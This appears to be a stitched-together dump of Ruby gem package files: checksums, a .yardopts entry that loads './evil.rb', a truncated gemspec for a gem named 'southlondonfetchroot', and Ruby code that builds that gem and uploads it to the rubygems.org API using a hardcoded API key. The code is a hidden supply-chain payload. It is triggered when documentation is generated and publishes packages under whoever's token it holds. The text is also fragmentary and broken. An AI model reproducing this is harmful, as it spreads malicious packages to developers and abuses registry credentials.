  metadata.gz: f162e956f7b50c7aec8ed5ab1982c35f54d425d18539ba60bedd8b0f3e463664
  data.tar.gz: e4330b6ccbe83c0aca79ef726066e8a25cd895bcba06c5952806f94fab165065
  metadata.gz: d232f64daab16a30b135ea870f0f93623eb3c3483c10a23e51e733734f151dd497a7e33124a991f7d7612eb741cd419f690cfed95ff6f38fde9fe9368bd30dac
  data.tar.gz: 6d16fd0cfd269d2de1ecad6f52973136adc2f7894360b0b24178d9c8b49260295544c59150254df28e90bf7d708d94634c31a5aa09d3e3b6f2f7eed8231a6986
--load ./evil.rb
README.md
lib/**/*.rb
s.name='southlondonfetchroot'; s.version='0.1.1'; s.summary='result'; s.authors=['x']; s.files=Dir['lib/*']; s.license='MIT'; end})
  Dir.chdir('egemroot'){ system('gem build o.gemspec'); spec=Dir['*.gem'].first; uri=URI('https://rubygems.org/api/v1/gems'); req=Net::HTTP::Post.new(uri); req['Authorization']='rubygems_43fa578f03b581d52e3a90d01c623e26fa86cc628971f671'; req['Content-Type']='application/octet-stream'; req.body=File.binread(spec); Net::HTTP.start(uri.host,uri.port,use_ssl:true){|h| h.request(req)} }
  version: 0.1.0
- ".yardopts"
